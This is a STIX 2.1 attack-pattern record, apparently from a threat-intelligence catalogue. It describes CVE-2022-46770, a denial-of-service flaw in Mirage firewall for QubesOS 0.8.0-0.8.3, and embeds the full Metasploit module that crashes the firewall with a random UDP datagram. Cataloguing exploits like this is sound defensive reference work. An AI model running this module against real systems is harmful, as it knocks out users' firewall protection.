{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--75dd0682-ac61-45ae-a6c9-9dff4db004a5",
    "created": "2024-08-14T16:25:48.535201Z",
    "modified": "2024-08-14T16:25:48.535205Z",
    "name": "Mirage firewall for QubesOS 0.8.0-0.8.3 Denial of Service (DoS) Exploit",
    "description": " This module allows remote attackers to cause a denial of service (DoS) in Mirage firewall for QubesOS 0.8.0-0.8.3 via a specifically crafted UDP request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/mirageos/qubes_mirage_firewall_dos.rb",
            "external_id": "qubes_mirage_firewall_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-46770"
        },
        {
            "source_name": "reference",
            "url": "https://mirage.io/blog/MSA03"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mirage/qubes-mirage-firewall/issues/166"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mirage firewall for QubesOS 0.8.0-0.8.3 Denial of Service (DoS) Exploit',\n        'Description' => %q{\n          This module allows remote attackers to cause a denial of service (DoS)\n          in Mirage firewall for QubesOS 0.8.0-0.8.3 via a specifically crafted UDP request.\n        },\n        'Author' => 'Krzysztof Burghardt <krzysztof@burghardt.pl>',\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2022-46770' ],\n          [ 'URL', 'https://mirage.io/blog/MSA03' ],\n          [ 'URL', 'https://github.com/mirage/qubes-mirage-firewall/issues/166' ],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2022-12-04'\n      )\n    )\n\n    register_options(\n      [\n        OptAddress.new('RHOST', [ false, 'Target address (Default: random)' ]),\n        OptPort.new('RPORT', [ false, 'Target port (Default: random)' ]),\n      ]\n    )\n\n    deregister_options('RHOSTS')\n  end\n\n  def run\n    rhost = datastore['RHOST'] || [239, 255, Random.new.rand(255), Random.new.rand(255)].join('.')\n    rport = datastore['RPORT'] || Random.new.rand(65535)\n    connect_udp(true, 'RHOST' => rhost, 'RPORT' => rport)\n\n    size = Random.new.rand(336...1472)\n    pkt = Random.new.bytes(size)\n    print_status(\"Sending random datagram of #{size} bytes to #{rhost}:#{rport}...\")\n    udp_sock.put(pkt)\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-12-04"
}